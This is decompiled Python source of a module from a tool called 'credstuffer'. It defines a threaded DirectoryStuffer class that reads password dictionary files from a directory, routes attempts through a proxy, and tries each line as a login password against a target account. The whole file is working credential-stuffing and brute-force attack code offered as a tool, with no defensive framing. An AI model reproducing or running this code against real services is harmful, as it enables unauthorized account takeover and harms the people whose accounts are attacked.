# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: build/bdist.linux-x86_64/egg/credstuffer/directory_stuffer.py
# Compiled at: 2020-04-05 08:14:43
# Size of source mod 2**32: 2053 bytes
import os, logging, threading
from credstuffer.stuffer import Stuffer

class DirectoryStuffer(Stuffer, threading.Thread):
    __doc__ = ' class DirectoryStuffer to execute the stuffing algorithm with directories including dict files\n\n    USAGE:\n            dirstuffer = DirectoryStuffer(account=account, directory_path=/tmp/)\n            dirstuffer.start()\n    '

    def __init__(self, account, directory_path):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('Create class DirectoryStuffer')
        Stuffer.__init__(self, account=account)
        threading.Thread.__init__(self)
        if os.path.isdir(directory_path):
            self.directory_path = directory_path
        else:
            raise TypeError('Given path {} is not a directory'.format(directory_path))

    def run(self) -> None:
        """ executes the run thread for account logins """
        self.set_account_proxy()
        self.logger.info('Load files from directory {}'.format(self.directory_path))
        for root, subdirs, files in os.walk(self.directory_path):
            for file in files:
                filepath = os.path.join(root, file)
                if os.path.isfile(filepath):
                    self.logger.info('Open file {} for stuffing'.format(filepath))
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as (f):
                        for lineno, line in enumerate(f):
                            password = line.strip('\n')
                            self.account_login(password=password)
                            if lineno % 1000 == 0:
                                self.logger.info('File {} with line number {} and password {}'.format(file, lineno, password))

                else:
                    self.logger.error('File: {} is not a regular file'.format(filepath))